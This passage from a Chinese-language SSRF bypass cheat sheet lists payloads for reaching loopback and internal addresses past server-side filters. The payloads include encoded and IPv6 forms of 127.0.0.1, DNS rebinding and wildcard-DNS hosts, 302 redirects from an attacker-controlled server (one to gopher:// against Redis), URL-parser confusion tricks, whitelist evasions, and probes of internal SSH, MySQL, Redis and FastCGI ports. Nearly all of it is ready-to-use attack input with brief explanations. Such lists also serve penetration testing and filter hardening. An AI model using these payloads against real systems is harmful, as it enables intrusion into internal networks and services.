## 三、IP与URL绕过技术

### 3.1 IP地址编码绕过
```
# 127.0.0.1的各种编码形式

# 十进制整数
http://2130706433            （0x7f000001的十进制=2130706433）
http://0177.0.0.1            （八进制）
http://0x7f.0x0.0x0.0x1      （十六进制）
http://0x7f000001            （十六进制整数）

# 混合编码
http://0x7f.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]   （IPv6映射IPv4）
http://[::ffff:127.0.0.1]
http://0:0:0:0:0:ffff:7f00:1/128
http://[::1]

# 数字点分（少点变体）
http://127.1                   （=127.0.0.1）
http://127.0.1
http://127.0.0.0x1

# 特殊写法
http://0
http://0.0.0.0
http://127.1
http://127.0.0.1.
http://127.0.0.1:80
http://[::1]:80
```

### 3.2 DNS重绑定绕过
利用DNS TTL短时间变换IP，WAF校验时解析到合法IP，服务器实际请求时解析到内网IP。
```
# 工具
https://lock.cmpxchg8b.com/rebinder.html

# 原理
DNS查询1 → 返回公网IP 1.2.3.4（通过WAF检查）
DNS查询2（极短TTL后） → 返回127.0.0.1（服务器实际请求）

# 使用
http://7f000001.0a000001.rbndr.us （rbndr.us是公共DNS重绑定服务）
http://A.127.0.0.1.1time.127.0.0.1.forever.3d.3103a6b1.0302b45a.rbndr.us
```

### 3.3 DNS解析绕过
```
# 利用域名指向127.0.0.1
http://spoofed.burpcollaborator.net   （Burp Collaborator指向内部？不）
http://127.0.0.1.nip.io              （nip.io：127.0.0.1.nip.io → 127.0.0.1）
http://app.127.0.0.1.nip.io
http://customer1.app.10.0.0.1.nip.io
http://192.168.1.100.xip.io          （xip.io同理）
http://localtest.me                  （指向127.0.0.1）
http://customer1.localhost.me        （指向127.0.0.1）
http://127.0.0.1.nip.io:8080
http://[::1].nip.io
http://sm.aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.127.0.0.1.nip.io  （超长前缀绕过正则）

# 自建DNS解析
# 在attacker.com设置A记录指向127.0.0.1
http://internal.attacker.com    （自有域名解析到内网IP）

# DNS ToC/ToU绕过（Time-of-Check vs Time-of-Use）
# 与DNS重绑定类似，利用检查和使用时的DNS解析结果不同
```

### 3.4 302跳转绕过
若后端只校验首次URL，通过302跳转到内网地址。
```
# 思路：在自己服务器上配置302重定向
# http://attacker.com/redirect → 302 Location: http://127.0.0.1/

# PHP 302跳转：
<?php header("Location: http://127.0.0.1/"); ?>

# 短链接服务
http://bit.ly/xxx    （短链接指向内网，若短链接服务在白名单）
http://t.cn/xxx

# 利用已知开放跳转漏洞
# 若同域存在open redirect，绕过同源SSRF限制
https://target.com/redirect?url=http://127.0.0.1/

# Gopher重定向
# http://attacker.com/302.php → 302到 gopher://127.0.0.1:6379/_...
```

### 3.5 协议解析差异绕过
```
# @符号URL解析差异
http://attacker.com@127.0.0.1/        （部分解析器认为attacker.com是用户名，实际访问127.0.0.1）
http://attacker.com#@127.0.0.1/       （#后为fragment，部分解析不同）
http://<EMAIL-REDACTED>      （空字节截断）
http://attacker.com%00@127.0.0.1

# URL编码/混淆
http://127.0.0.1%0a.attacker.com
http://127.0.0.1\t.attacker.com
http://127.0.0.1\n.attacker.com
http://127.0.0.1%09.attacker.com
http://127.0.0.1.attacker.com

# 反斜杠差异
http://127.0.0.1\attacker.com
http://attacker.com\@127.0.0.1

# 多斜杠
http:////127.0.0.1
http://///127.0.0.1
http:///\\127.0.0.1
http://127.0.0.1/..

# 句号欺骗
http://127。0。0。1      （中文句号→某些解析器自动转换）
http://127．0．0．1
```

### 3.6 白名单域名绕过
```
# 子域名
http://127.0.0.1.attacker.com           （DNS解析：attacker.com的子域）
http://127.0.0.1.xip.io                 （xip.io通配）

# 域名匹配绕过
# 白名单包含target.com
http://target.com.attacker.com           （前缀加后缀，不属于target.com）
http://attacker.com?target.com           （参数里包含白名单）
http://attacker.com#target.com
http://<EMAIL-REDACTED>           （@符号实际访问attacker.com）

# 利用URL解析器差异
# Java URI解析与HTTP client不同
new URI("http://attacker.com#@127.0.0.1") → host=attacker.com
HTTP client实际请求→ http://attacker.com#@127.0.0.1 → 浏览器忽略#fragment但某些HTTP库不会
```

### 3.7 进制/特殊编码
```
# 八进制
http://0177.0.0.1
http://0177.0.0.01
http://0177.00.00.01
http://017700000001

# 十六进制
http://0x7f.0x0.0x0.0x1
http://0x7f000001

# 混合编码
http://0x7f.0.0.1
http://127.0x0.0.0x1
http://0177.0.0x1

# URL编码
http://%31%32%37%2e%30%2e%30%2e%31       (=127.0.0.1)
http://127.0.0.1%2f%2f
http://127.0.0.1%3a80

# 双重URL编码
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
```

### 3.8 IPv6绕过
```
http://[::1]                              （IPv6回环）
http://[::ffff:127.0.0.1]                （IPv4映射IPv6）
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0000::1]
http://[::]
http://[::1]:80

# 内网IPv6
http://[fd00::1]                           （ULA内网地址）
http://[fe80::1]                           （链路本地）
```

### 3.9 非常规组合绕过
```
# 利用redirect chain
# 短链接→302→内网IP
http://t.cn/xxxx → 302 → http://127.0.0.1/

# 利用非HTTP协议端口
http://127.0.0.1:22                        （探测SSH）
http://127.0.0.1:3306                      （MySQL）
http://127.0.0.1:6379                      （Redis）
http://127.0.0.1:8080
http://127.0.0.1:9000                      （FastCGI）

# 非ASCII字符
http://127.0.0.1。        （中文句号→某些库转换为.）
http://127%E3%80%820%E3%80%820%E3%80%821
```

